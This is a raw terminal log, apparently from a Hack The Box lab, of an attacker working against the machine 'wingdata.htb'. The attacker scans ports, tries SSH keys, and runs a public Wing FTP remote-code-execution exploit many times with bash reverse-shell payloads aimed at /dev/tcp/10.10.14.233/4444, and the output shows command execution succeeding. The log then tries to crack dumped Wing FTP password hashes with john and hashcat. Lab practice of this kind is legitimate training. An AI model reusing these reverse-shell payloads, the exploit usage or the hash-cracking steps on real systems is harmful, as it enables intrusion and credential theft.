+debug1: kex_ext_info_client_parse: server-sig-algs=<ssh-ed25519,sk-ssh-ed25519@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ecdsa-sha2-nistp256@openssh.com,webauthn-sk-ecdsa-sha2-nistp256@openssh.com,ssh-dss,ssh-rsa,rsa-sha2-256,rsa-sha2-512>
+debug1: kex_ext_info_check_ver: publickey-hostbound@openssh.com=<0>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: get_agent_identities: bound agent to hostkey
+debug1: get_agent_identities: ssh_fetch_identitylist: agent contains no identities
+debug1: Will attempt key: wingftp.key  explicit
+debug1: Trying private key: wingftp.key
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: password
+wingftp@wingdata.htb's password: 
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh wacky@wingdata.htb -i wingftp.key -v
+debug1: OpenSSH_10.2p1 Debian-2, OpenSSL 3.5.5 27 Jan 2026
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to wingdata.htb [10.129.16.163] port 22.
+debug1: Connection established.
+debug1: no pubkey loaded from wingftp.key
+debug1: identity file wingftp.key type -1
+debug1: no identity pubkey loaded from wingftp.key
+debug1: Local version string SSH-2.0-OpenSSH_10.2p1 Debian-2
+debug1: Remote protocol version 2.0, remote software version OpenSSH_9.2p1 Debian-2+deb12u7
+debug1: compat_banner: match: OpenSSH_9.2p1 Debian-2+deb12u7 pat OpenSSH* compat 0x04000000
+debug1: Authenticating to wingdata.htb:22 as 'wacky'
+debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: sntrup761x25519-sha512
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w
+debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: Host 'wingdata.htb' is known and matches the ED25519 host key.
+debug1: Found key in /home/kali/.ssh/known_hosts:11
+debug1: ssh_packet_send2_wrapped: resetting send seqnr 3
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: ssh_packet_read_poll2: resetting read seqnr 3
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_ext_info_client_parse: server-sig-algs=<ssh-ed25519,sk-ssh-ed25519@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ecdsa-sha2-nistp256@openssh.com,webauthn-sk-ecdsa-sha2-nistp256@openssh.com,ssh-dss,ssh-rsa,rsa-sha2-256,rsa-sha2-512>
+debug1: kex_ext_info_check_ver: publickey-hostbound@openssh.com=<0>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: get_agent_identities: bound agent to hostkey
+debug1: get_agent_identities: ssh_fetch_identitylist: agent contains no identities
+debug1: Will attempt key: wingftp.key  explicit
+debug1: Trying private key: wingftp.key
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: password
+wacky@wingdata.htb's password: 
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -v wingdata.htb 5466
+ls
+^C
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nmap wingdata.htb -p5466 -sC -sV              
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 18:44 EDT
+Nmap scan report for wingdata.htb (10.129.16.163)
+Host is up (0.13s latency).
+
+PORT     STATE    SERVICE VERSION
+5466/tcp filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nmap wingdata.htb -p5466 -sC -sV --source-port 53
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 18:44 EDT
+Nmap scan report for wingdata.htb (10.129.16.163)
+Host is up (0.055s latency).
+
+PORT     STATE    SERVICE VERSION
+5466/tcp filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.92 seconds
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano wingftp2          
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ chmod 600 wingftp2   
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ssh wingftp@wingdata.htb -i wingftp2             
+[sudo] password for kali: 
+The authenticity of host 'wingdata.htb (10.129.16.163)' can't be established.
+ED25519 key fingerprint is: SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'wingdata.htb' (ED25519) to the list of known hosts.
+wingftp@wingdata.htb's password: 
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ssh wacky@wingdata.htb -i wingftp2
+wacky@wingdata.htb's password: 
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ssh admin@wingdata.htb -i wingftp2
+admin@wingdata.htb's password: 
+Connection closed by 10.129.16.163 port 22
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+ 51902.py                  'exploit(1).py'       full_results.xml   kobold.gnmap     machines_sg-2.ovpn  'machines_us-7(1).ovpn'  'poc(1).py'                            wingftp2
+ 52347.py                   exploit.py           hash.txt           kobold-htb.crt   machines_us-4.ovpn   machines_us-7.ovpn       poc.py                                wingftp.key
+'academy-regular(1).ovpn'   full_results.gnmap   id_ed25519         kobold.nmap      machines_us-5.ovpn   passwd                   pspy64
+ academy-regular.ovpn       full_results.nmap   'id_ed25519(1)'     kobold.xml       machines_us-6.ovpn  'passwd(1)'              'release_arena_us-release-2(1).ovpn'
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1'"       
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27' and username: 'anonymous'                                                                                                                                                                                     
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: Please check proxy URL. It is malformed and could be missing the host.
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1'"
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27' and username: 'anonymous'                                                                                                                                                                                     
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: Please check proxy URL. It is malformed and could be missing the host.
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1'"
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27' and username: 'anonymous'                                                                                                                                                                                     
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: Please check proxy URL. It is malformed and could be missing the host.
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c 'bash -c "/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1"'   
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22' and username: 'anonymous'                                                                                                                                                                        
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: Please check proxy URL. It is malformed and could be missing the host.
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c 'bash -c "/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1"'
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22' and username: 'anonymous'                                                                                                                                                                        
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: Please check proxy URL. It is malformed and could be missing the host.
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "ping 10.10.14.233 -c 3"                                            
+
+[*] Testing target: http://ftp.wingdata.htb
+ping%2010.10.14.233%20-c%203
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ping%2010.10.14.233%20-c%203' and username: 'anonymous'
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: Please check proxy URL. It is malformed and could be missing the host.
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "ping 10.10.14.233 -c 3"
+
+[*] Testing target: http://ftp.wingdata.htb
+ping%2010.10.14.233%20-c%203
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ping%2010.10.14.233%20-c%203' and username: 'anonymous'
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: Please check proxy URL. It is malformed and could be missing the host.
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ unset HTTP_PROXY
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1'"         
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27' and username: 'anonymous'                                                                                                                                                                                     
+[+] UID extracted: f0157db49dd52e7fc6e0e28398297cabf528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: f0157db49dd52e7fc6e0e28398297cabf528764d624db129b32c21fbca0cb8d6
+[-] Error sending GET request to http://ftp.wingdata.htb/dir.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1'"
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27' and username: 'anonymous'                                                                                                                                                                                     
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c 'bash -c "/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1"'
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22' and username: 'anonymous'                                                                                                                                                                        
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c 'bash -c "/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1"'
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%22/bin/bash%20-l%20%3E%20/dev/tcp/10.10.14.233/4444%200%3C%261%202%3E%261%22' and username: 'anonymous'                                                                                                                                                                        
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'echo hi'"                                            
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27echo%20hi%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27echo%20hi%27' and username: 'anonymous'
+[-] Error sending POST request to http://ftp.wingdata.htb/loginok.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'echo hi'"
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27echo%20hi%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27echo%20hi%27' and username: 'anonymous'
+[+] UID extracted: e2b9c8930f49a7aee9526500fba7610af528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: e2b9c8930f49a7aee9526500fba7610af528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---                                                                                                                                                                
+hi
+----------------------
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1'"         
+
+[*] Testing target: http://ftp.wingdata.htb
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.233/4444%200%3E%261%27' and username: 'anonymous'                                                                                                                                                                                     
+[+] UID extracted: d904de6c869199308298e3ed2c5a032af528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: d904de6c869199308298e3ed2c5a032af528764d624db129b32c21fbca0cb8d6
+[-] Error sending GET request to http://ftp.wingdata.htb/dir.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
+       
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh wacky@wingdata.htb
+wacky@wingdata.htb's password: 
+Permission denied, please try again.
+wacky@wingdata.htb's password: 
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls              
+ 51902.py                  'exploit(1).py'       full_results.xml   kobold.gnmap     machines_sg-2.ovpn  'machines_us-7(1).ovpn'  'poc(1).py'                            wingftp2
+ 52347.py                   exploit.py           hash.txt           kobold-htb.crt   machines_us-4.ovpn   machines_us-7.ovpn       poc.py                                wingftp.key
+'academy-regular(1).ovpn'   full_results.gnmap   id_ed25519         kobold.nmap      machines_us-5.ovpn   passwd                   pspy64
+ academy-regular.ovpn       full_results.nmap   'id_ed25519(1)'     kobold.xml       machines_us-6.ovpn  'passwd(1)'              'release_arena_us-release-2(1).ovpn'
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd ..                   
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ ls
+Desktop  Documents  Downloads  full_scan.gnmap  full_scan.nmap  full_scan.xml  id_rsa  Music  Pictures  Public  Templates  tmp-acctf  Videos
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ cd Downloads 
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt       
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=wingftp --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Unknown ciphertext format name requested
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=wingftpd --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Unknown ciphertext format name requested
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --list=formats | grep -i "wing"                                       
+414 formats (149 dynamic formats shown as just "dynamic_n" here)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt                                                              
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=wingftpd --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Unknown ciphertext format name requested
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --list=formats                                                        
+descrypt, bsdicrypt, md5crypt, md5crypt-long, bcrypt, scrypt, LM, AFS, 
+tripcode, AndroidBackup, adxcrypt, agilekeychain, aix-ssha1, aix-ssha256, 
+aix-ssha512, andOTP, ansible, argon2, as400-des, as400-ssha1, asa-md5, 
+AxCrypt, AzureAD, BestCrypt, BestCryptVE4, bfegg, Bitcoin, BitLocker, 
+bitshares, Bitwarden, BKS, Blackberry-ES10, WoWSRP, Blockchain, chap, 
+Clipperz, cloudkeychain, dynamic_n, cq, CRC32, cryptoSafe, sha1crypt, 
+sha256crypt, sha512crypt, Citrix_NS10, dahua, dashlane, diskcryptor, Django, 
+django-scrypt, dmd5, dmg, dominosec, dominosec8, DPAPImk, dragonfly3-32, 
+dragonfly3-64, dragonfly4-32, dragonfly4-64, Drupal7, eCryptfs, eigrp, 
+electrum, EncFS, enpass, EPI, EPiServer, ethereum, fde, Fortigate256, 
+Fortigate, FormSpring, FVDE, geli, gost, gpg, HAVAL-128-4, HAVAL-256-3, hdaa, 
+hMailServer, hsrp, IKE, ipb2, itunes-backup, iwork, KeePass, keychain, 
+keyring, keystore, known_hosts, krb4, krb5, krb5asrep, krb5pa-sha1, krb5tgs, 
+krb5-17, krb5-18, krb5-3, kwallet, lp, lpcli, leet, lotus5, lotus85, LUKS, 
+MD2, mdc2, MediaWiki, monero, money, MongoDB, scram, Mozilla, mscash, 
+mscash2, MSCHAPv2, mschapv2-naive, krb5pa-md5, mssql, mssql05, mssql12, 
+multibit, mysqlna, mysql-sha1, mysql, net-ah, nethalflm, netlm, netlmv2, 
+net-md5, netntlmv2, netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, 
+nsec3, NT, o10glogon, o3logon, o5logon, ODF, Office, oldoffice, 
+OpenBSD-SoftRAID, openssl-enc, oracle, oracle11, Oracle12C, osc, ospf, 
+Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1, 
+PBKDF2-HMAC-SHA256, PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, 
+pgpwde, phpass, PHPS, PHPS2, pix-md5, PKZIP, po, postgres, PST, PuTTY, 
+pwsafe, qnx, RACF, RACF-KDFAES, radius, RAdmin, RAKP, rar, RAR5, Raw-SHA512, 
+Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1, 
+Raw-SHA1-AxCrypt, Raw-SHA1-Linkedin, Raw-SHA224, Raw-SHA256, Raw-SHA3, 
+Raw-SHA384, restic, ripemd-128, ripemd-160, rsvp, RVARY, Siemens-S7, 
+Salted-SHA1, SSHA512, sapb, sapg, saph, sappse, securezip, 7z, Signal, SIP, 
+skein-256, skein-512, skey, SL3, Snefru-128, Snefru-256, LastPass, SNMP, 
+solarwinds, SSH, sspr, STRIP, SunMD5, SybaseASE, Sybase-PROP, tacacs-plus, 
+tcp-md5, telegram, tezos, Tiger, tc_aes_xts, tc_ripemd160, tc_ripemd160boot, 
+tc_sha512, tc_whirlpool, vdi, OpenVMS, vmx, VNC, vtp, wbb3, whirlpool, 
+whirlpool0, whirlpool1, wpapsk, wpapsk-pmk, xmpp-scram, xsha, xsha512, zed, 
+ZIP, ZipMonster, plaintext, has-160, HMAC-MD5, HMAC-SHA1, HMAC-SHA224, 
+HMAC-SHA256, HMAC-SHA384, HMAC-SHA512, dummy, crypt
+414 formats (149 dynamic formats shown as just "dynamic_n" here)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt                                                              
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=wingftpd --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Unknown ciphertext format name requested
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                  
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=dynamic='sha256($p.WingFTP)' --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Dyna expression syntax error around this part of expression
+sha256($p.WingFTP)
+          ^
+Invalid token following the . character
+exiting now                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=dynamic_26 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                  
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt                                                                
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --show hash.txt                                     
+0 password hashes cracked, 0 left
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt                                            
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Unknown ciphertext format name requested
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat hash.txt
+wacky:$5$WingFTP$32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+admin:$5$WingFTP$a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=sha256crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat hash.txt
+wacky:$5$WingFTP$32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+admin:$5$WingFTP$a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --list=formats | grep -i 256
+
+414 formatstripcode, AndroidBackup, adxcrypt, agilekeychain, aix-ssha1, aix-ssha256, 
+ (149 dynamic formats shown as just "dynamic_n" here)
+sha256crypt, sha512crypt, Citrix_NS10, dahua, dashlane, diskcryptor, Django, 
+electrum, EncFS, enpass, EPI, EPiServer, ethereum, fde, Fortigate256, 
+Fortigate, FormSpring, FVDE, geli, gost, gpg, HAVAL-128-4, HAVAL-256-3, hdaa, 
+PBKDF2-HMAC-SHA256, PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, 
+Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1, 
+Raw-SHA1-AxCrypt, Raw-SHA1-Linkedin, Raw-SHA224, Raw-SHA256, Raw-SHA3, 
+skein-256, skein-512, skey, SL3, Snefru-128, Snefru-256, LastPass, SNMP, 
+HMAC-SHA256, HMAC-SHA384, HMAC-SHA512, dummy, crypt
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat -A hash.txt
+wacky:$5$WingFTP$32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca$
+admin:$5$WingFTP$a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba$
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --show hash.txt                                     
+0 password hashes cracked, 0 left
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano hash.txt                                                                
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #01: cpu--0x000, 1466/2932 MB (512 MB allocatable), 10MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashfile 'hash.txt' on line 1 (32940d...aae76ff5b8783994f8a503ca:WingFTP): Separator unmatched
+Hashfile 'hash.txt' on line 2 (a8339f...b983844c8562bef2193bafba:WingFTP): Separator unmatched
+No hashes loaded.
+
+Started: Thu Apr  2 20:50:07 2026
+Stopped: Thu Apr  2 20:50:07 2026
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 1410 -a hashes.txt /usr/share/wordlists/rockyou.txt
+The specified parameter cannot use 'hashes.txt' as a value - must be a number.
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
